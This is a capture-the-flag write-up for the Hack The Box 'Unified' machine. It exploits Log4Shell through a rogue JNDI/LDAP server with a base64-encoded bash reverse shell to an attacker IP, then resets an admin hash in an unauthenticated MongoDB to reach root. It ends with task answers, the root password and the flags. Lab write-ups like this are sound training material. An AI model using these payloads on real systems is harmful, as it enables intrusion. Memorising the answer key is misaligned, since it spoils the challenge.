---
layout: single
title: Unified - Hack The Box
excerpt: "We are exploiting the Log4Shell vulnerability (CVE-2021-44228) on this machine and taking advantage of MongoDB misconfiguration."
date: 2025-03-18
classes: wide
header:
  teaser: /img2/unified.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Very Easy
tags:
  - Log4Shell
  - MongoDB
---


![](/img2/Pasted%20image%2020250317194438.png)

## Introduction

> We are exploiting the Log4Shell vulnerability (CVE-2021-44228) on this machine and taking advantage of MongoDB misconfiguration.

## Reconnaissance

- Connectivity

```bash
ping -c1 10.129.87.49
```

- Nmap

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.129.87.49
```

![](/img2/Pasted%20image%2020250317194604.png)

- Version scan with nmap

```bash
nmap -sV -p22,6789,8080,8443,8843,8880 10.129.87.49
```

![](/img2/Pasted%20image%2020250317195906.png)

- Check the version of UniFi 

![](/img2/Pasted%20image%2020250318164539.png)

- Try to inject jndi malicious command

![](/img2/Pasted%20image%2020250318164643.png)

![](/img2/Pasted%20image%2020250318164709.png)

> If we have a connection the machine is vulnerable for Log4shell



```bash
java -jar ysoserial-modified.jar CommonsCollections3 bash 'bash -i >& /dev/tcp/10.10.16.34/9000 0>&1' > payload.ser
```

## Exploitation


- Exploit Log4shell vulnerability

```bash
git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package
```

- Check if LDAP server works

```bash
java -jar RogueJndi-1.1.jar --command 'whoami' --hostname 10.10.16.34
```

![](/img2/Pasted%20image%2020250319161543.png)

```bash
tcpdump -i tun0 port 389 -v
```

![](/img2/Pasted%20image%2020250319111549.png)

- Send reverse shell in base64

```bash
echo "bash -i >& /dev/tcp/10.10.16.34/9000 0>&1"|base64
```

```bash
java -jar RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMzQvOTAwMCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname 10.10.16.34
```

![](/img2/Pasted%20image%2020250319161543.png)

```bash
nc -nlvp 9000
```


## Post-exploitation

- See actual process

```bash
ps aux
```
![](/img2/Pasted%20image%2020250318230925.png)

- Connect to MongoDB without credentials

```bash
mongo --port 27117
```

```bash
show dbs
```

![](/img2/Pasted%20image%2020250318231102.png)

```bash
use ace
show collections
```

![](/img2/Pasted%20image%2020250318231303.png)

```bash
db.admin.find().forEach(printjson)
```

![](/img2/Pasted%20image%2020250318231439.png)

- Create SHA-512 password

```bash
mkpasswd -m sha-512 pass
```

- Change administrator password 

```bash
db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$6bm13IhH/uh7JzE.$BDesurCeAnw.uSQMDgVa6fGVK/G9w1WrOIkPPInm3eY86pkXJmts.aEpU6S5k34/ubTXZAq.pe4rXgTNPNlJc1"}})
```

![](/img2/Pasted%20image%2020250318230845.png)

- Check root password and connect with SSH

![](/img2/Pasted%20image%2020250318231944.png)

```bash
ssh root@10.129.2.168
```

## Tasks

1. Which are the first four open ports?
> 22,6789,8080,8443

2. What is the title of the software that is running running on port 8443?
> UniFi Network

3. What is the version of the software that is running?
> 6.4.54

4. What is the CVE for the identified vulnerability?
> CVE-2021-44228

5. What protocol does JNDI leverage in the injection?
> ldap

6. What tool do we use to intercept the traffic, indicating the attack was successful?
> tcpdump

7. What port do we need to inspect intercepted traffic for?
> 389

8. What port is the MongoDB service running on?
> 27117

9. What is the default database name for UniFi applications?
> ace

10. What is the function we use to enumerate users within the database in MongoDB?
> db.admin.find()

11. What is the function we use to update users within the database in MongoDB?
> db.admin.update()

12. What is the password for the root user?
> NotACrackablePassword4U2022

13. Submit user flag
> 6ced1a6a89e666c0620cdb10262ba127

14. Submit root flag
> e50bc93c75b634e4b272d2f771c33681


![](/img2/Pasted%20image%2020250318232724.png)